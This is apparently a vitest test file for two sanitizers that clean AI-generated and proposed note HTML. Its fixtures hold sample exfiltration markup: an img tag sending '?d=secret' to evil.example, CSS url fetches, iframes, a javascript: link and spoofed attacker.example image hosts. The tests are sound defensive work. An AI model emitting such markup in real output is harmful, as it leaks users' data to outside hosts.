import { describe, expect, it } from 'vitest';

import { sanitizeAiHtml, sanitizeProposalHtml } from './sanitize-ai-html';

describe('sanitizeAiHtml', () => {
  it('should strip img tags entirely', () => {
    const result = sanitizeAiHtml(
      '<p>hi</p><img src="https://evil.example/?d=secret">'
    );
    expect(result).not.toContain('<img');
    expect(result).toContain('<p>hi</p>');
  });

  it('should strip style attributes that could fire CSS fetches', () => {
    const result = sanitizeAiHtml(
      '<div style="background:url(https://evil.example/x)">text</div>'
    );
    expect(result).not.toContain('style=');
    expect(result).toContain('text');
  });

  it('should strip media and embedding tags', () => {
    const result = sanitizeAiHtml(
      '<video src="https://evil.example/v"></video><iframe src="https://evil.example"></iframe><svg><image href="https://evil.example/s"/></svg>'
    );
    expect(result).not.toContain('<video');
    expect(result).not.toContain('<iframe');
    expect(result).not.toContain('<svg');
  });

  it('should keep formatting markup and safe links', () => {
    const result = sanitizeAiHtml(
      '<h2>Title</h2><p><strong>bold</strong> and <a href="https://example.com">link</a></p><ul><li>item</li></ul>'
    );
    expect(result).toContain('<h2>Title</h2>');
    expect(result).toContain('<strong>bold</strong>');
    expect(result).toContain('href="https://example.com"');
    expect(result).toContain('<li>item</li>');
  });

  it('should strip javascript: links', () => {
    const result = sanitizeAiHtml('<a href="javascript:alert(1)">x</a>');
    expect(result).not.toContain('javascript:');
  });
});

describe('sanitizeProposalHtml', () => {
  const STORED_SRC =
    'https://iy4r311mpkfdcnup.public.blob.vercel-storage.com/notes/n1/lake.webp';

  it('keeps an image figure the app stored, with its size and caption', () => {
    const html = `<figure data-image=""><img src="${STORED_SRC}" alt="lake" width="320" height="200"><figcaption>Lake</figcaption></figure>`;
    expect(sanitizeProposalHtml(html)).toBe(html);
  });

  it('keeps only the image attributes the note schema reads', () => {
    expect(
      sanitizeProposalHtml(
        `<img src="${STORED_SRC}" alt="lake" title="t" class="c" loading="lazy" referrerpolicy="unsafe-url">`
      )
    ).toBe(`<img src="${STORED_SRC}" alt="lake">`);
  });

  it.each([
    ['another host', 'https://attacker.example/collect.png'],
    [
      'another blob store',
      'https://attacker123.public.blob.vercel-storage.com/x.webp',
    ],
    ['http', 'http://iy4r311mpkfdcnup.public.blob.vercel-storage.com/x.webp'],
    [
      'the store name as a subdomain prefix',
      'https://iy4r311mpkfdcnup.public.blob.vercel-storage.com.attacker.example/x.webp',
    ],
    ['a data url', 'data:image/png;base64,AAAA'],
  ])('drops the whole figure of an image from %s', (_label, src) => {
    expect(
      sanitizeProposalHtml(
        `<p>a</p><figure data-image=""><img src="${src}" alt="x"><figcaption>cap</figcaption></figure><p>b</p>`
      )
    ).toBe('<p>a</p><p>b</p>');
  });

  it('drops a foreign image outside a figure and a figure holding no image', () => {
    expect(
      sanitizeProposalHtml(
        '<p>a<img src="https://attacker.example/collect.png"></p><figure><figcaption>cap</figcaption></figure>'
      )
    ).toBe('<p>a</p>');
  });

  it('still strips every other tag that fetches on render', () => {
    expect(
      sanitizeProposalHtml(
        '<p>a</p><video src="https://evil.example/v"></video><iframe src="https://evil.example"></iframe><div style="background:url(https://evil.example/x)">t</div>'
      )
    ).toBe('<p>a</p><div>t</div>');
  });

  it('leaves the shared AI sanitizer stripping every image', () => {
    expect(sanitizeAiHtml(`<p>a</p><img src="${STORED_SRC}" alt="lake">`)).toBe(
      '<p>a</p>'
    );
  });
});
